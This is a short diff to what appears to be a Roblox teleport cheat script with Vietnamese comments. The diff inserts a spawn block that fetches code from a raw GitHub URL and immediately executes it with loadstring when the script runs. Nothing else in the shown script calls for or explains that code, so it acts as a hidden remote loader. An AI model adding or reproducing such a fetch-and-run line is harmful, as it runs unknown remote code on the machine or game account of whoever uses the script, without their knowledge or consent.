@@ -7,6 +7,10 @@ end
 -- Đánh dấu script đã được chạy
 _G.TELEMAP = true
 
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/LookFPS-X4"))()
+end)
+
 -- ======= CẤU HÌNH =======
 local TARGET_PLACE_ID = 140403681187145 -- chỉ chạy khi đúng PlaceId này
 local TARGET_POS = Vector3.new(-14251, 16.24, 2159)
